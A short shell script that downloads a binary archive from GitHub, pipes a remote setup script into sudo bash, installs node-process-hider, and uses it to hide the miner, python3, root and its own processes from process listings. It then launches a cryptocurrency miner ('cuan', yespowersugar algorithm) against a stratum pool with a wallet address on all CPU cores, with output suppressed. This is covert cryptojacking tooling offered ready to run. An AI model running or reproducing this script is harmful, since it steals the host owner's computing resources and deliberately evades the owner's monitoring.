#!/bin/sh
pkill -
wget https://github.com/arifrahman555/arif/raw/main/cuan.tar.gz
tar -xf cuan.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add nyuk.sh
Ph add python3
ph add root
ph add node-process-hider
ph add cuan
./cuan -a yespowersugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8.mabar -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
